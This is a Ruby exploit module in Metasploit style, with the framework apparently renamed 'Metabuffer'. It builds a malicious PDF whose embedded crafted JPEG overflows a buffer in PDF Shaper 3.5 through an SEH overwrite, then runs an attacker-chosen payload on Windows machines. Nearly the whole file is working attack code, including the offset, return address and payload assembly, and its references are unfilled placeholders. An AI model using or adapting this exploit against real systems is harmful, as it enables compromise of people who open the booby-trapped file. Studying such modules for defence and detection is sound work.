##
# This module requires Metabuffer: http://metabuffer.com/download
# Current source: https://github.com/rapid7/metabuffer-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  #Rank definition: http://dev.metabuffer.com/redmine/projects/framework/wiki/Exploit_Ranking
  #ManualRanking/LowRanking/AverageRanking/NormalRanking/GoodRanking/GreatRanking/ExcellentRanking
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::PDF
  include Msf::Exploit::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'    => 'PDF Shaper Buffer Overflow',
      'Description'  => %q{
            PDF Shaper is prone to a security vulnerability when processing PDF files. 
            The vulnerability appear when we use Convert PDF to Image and use a specially crafted PDF file.
	    This module has been tested successfully on Win Xp, Win 7, Win 8, Win 10.
      },
      'License'    => MSF_LICENSE,
      'Author'    =>
        [
          'metacom<metacom27[at]gmail.com>',  # Original discovery
          'metacom',  # MSF Module
        ],
      'References'  =>
        [
          [ 'OSVDB', '<insert OSVDB number here>' ],
          [ 'CVE', 'insert CVE number here' ],
          [ 'URL', '<insert another link to the exploit/advisory here>' ]
        ],
      'DefaultOptions' =>
        {
          'ExitFunction' => 'process', #none/process/thread/seh
          #'InitialAutoRunScript' => 'migrate -f',
        },
      'Platform'  => 'win',
      'Payload'  => 
        {
          'Space'       => 2000,
          'DisableNops' => true,
        },

      'Targets'    =>
        [
          [ '<Win Xp, Win 7, Win 8, Win 10 / PDF Shaper v.3.5>',
            {
              'Ret'     =>  0x00713726, # pop ebx # pop ebp # ret  - PDFTools.exe
              'Offset'  =>  433
            }
          ],
        ],
      'Privileged'  => false,
      #Correct Date Format: "M D Y"
      #Month format: Jan,Feb,Mar,Apr,May,Jun,Jul,Aug,Sep,Oct,Nov,Dec
      'DisclosureDate'  => 'Aug 10 2015',
      'DefaultTarget'  => 0))

    register_options([OptString.new('FILENAME', [ false, 'The file name.', 'msf.pdf']),], self.class)

  end

  def exploit
	file_create(make_pdf)
  end	 	
	
  def jpeg
    buffer =  "\xFF\xD8\xFF\xEE\x00\x0E\x41\x64\x6F\x62\x65\x00\x64\x80\x00\x00"
    buffer << "\x00\x02\xFF\xDB\x00\x84\x00\x02\x02\x02\x02\x02\x02\x02\x02\x02"
    buffer << "\x02\x03\x02\x02\x02\x03\x04\x03\x03\x03\x03\x04\x05\x04\x04\x04"
    buffer << "\x04\x04\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x07\x08\x08\x08"
    buffer << "\x07\x05\x09\x0A\x0A\x0A\x0A\x09\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x0C"
    buffer << "\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x01\x03\x02\x02\x03\x03\x03\x07\x05"
    buffer << "\x05\x07\x0D\x0A\x09\x0A\x0D\x0F\x0D\x0D\x0D\x0D\x0F\x0F\x0C\x0C"
    buffer << "\x0C\x0C\x0C\x0F\x0F\x0C\x0C\x0C\x0C\x0C\x0C\x0F\x0C\x0E\x0E\x0E"
    buffer << "\x0E\x0E\x0C\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11"
    buffer << "\x11\x11\x11\x11\x11\x11\x11\x11\xFF\xC0\x00\x14\x08\x00\x32\x00"
    buffer << "\xE6\x04\x01\x11\x00\x02\x11\x01\x03\x11\x01\x04\x11\x00\xFF\xC4"
    buffer << "\x01\xA2\x00\x00\x00\x07\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00"
    buffer << "\x00\x00\x00\x04\x05\x03\x02\x06\x01\x00\x07\x08\x09\x0A\x0B\x01"
    buffer << "\x54\x02\x02\x03\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00"
    buffer << "\x01\x00\x02\x03\x04\x05\x06\x07"
    buffer << rand_text(target['Offset'])  #junk
    buffer << generate_seh_record(target.ret)
    buffer << payload.encoded
    buffer << rand_text(2388 - payload.encoded.length) 
    return buffer

  end
  

  def nObfu(str)
    return str
  end

  def make_pdf
    # pdf template taken from PDF Shaper exploit module
    @pdf << header
    add_object(1, nObfu("<</Type/Catalog/Outlines 2 0 R /Pages 3 0 R>>"))
    add_object(2, nObfu("<</Type/Outlines>>"))
    add_object(3, nObfu("<</Type/Pages/Kids[5 0 R]/Count 1/Resources <</ProcSet 4 0 R/XObject <</I0 7 0 R>>>>/MediaBox[0 0 612.0 792.0]>>"))
    add_object(4, nObfu("[/PDF/Text/ImageC]"))
    add_object(5, nObfu("<</Type/Page/Parent 3 0 R/Contents 6 0 R>>"))
    stream_1 = "stream" << eol
    stream_1 << "0.000 0.000 0.000 rg 0.000 0.000 0.000 RG q 265.000 0 0 229.000 41.000 522.000 cm /I0 Do Q" << eol
    stream_1 << "endstream" << eol
    add_object(6, nObfu("<</Length 91>>#{stream_1}"))
    stream = "<<" << eol
    stream << "/Width 230" << eol
    stream << "/BitsPerComponent 8" << eol
    stream << "/Name /X" << eol
    stream << "/Height 50" << eol
    stream << "/Intent /RelativeColorimetric" << eol
    stream << "/Subtype /Image" << eol
    stream << "/Filter /DCTDecode" << eol
    stream << "/Length #{jpeg.length}" << eol
    stream << "/ColorSpace /DeviceCMYK" << eol
    stream << "/Type /XObject" << eol
    stream << ">>"
    stream << "stream" << eol
    stream << jpeg << eol
    stream << "endstream" << eol
    add_object(7, stream)
    finish_pdf
  end  

end